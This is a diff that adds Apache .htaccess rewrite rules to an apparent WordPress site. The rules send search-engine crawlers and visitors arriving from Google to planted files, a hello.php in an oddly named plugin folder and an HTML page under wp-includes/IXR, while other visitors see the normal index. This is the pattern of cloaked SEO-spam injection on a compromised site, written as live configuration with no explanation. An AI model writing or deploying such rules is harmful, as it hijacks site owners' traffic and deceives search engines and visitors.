@@ -1,0 +1,21 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^(.*)$
+RewriteRule ^ - [E=ENV_REFERRER:%1]
+RewriteCond %{ENV:ENV_REFERRER} google\.com [NC]
+RewriteRule ^$ /wp-content/plugins/elufdl/hello.php [L]
+RewriteCond %{HTTP_USER_AGENT} (Google|Bing|Yahoo|Yandex) [NC]
+RewriteRule ^$ /wp-content/plugins/elufdl/hello.php [L]
+RewriteRule ^$ /index.php [L]
+
+
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^(.*)$
+RewriteRule ^ - [E=ENV_REFERRER:%1]
+RewriteCond %{ENV:ENV_REFERRER} google\.com [NC]
+RewriteRule ^$ /wp-includes/IXR/index.html [L]
+RewriteCond %{HTTP_USER_AGENT} (Google|Bing|Yahoo|Yandex) [NC]
+RewriteRule ^$ /wp-includes/IXR/index.html [L]
+RewriteRule ^$ /index.php [L]
+</IfModule>
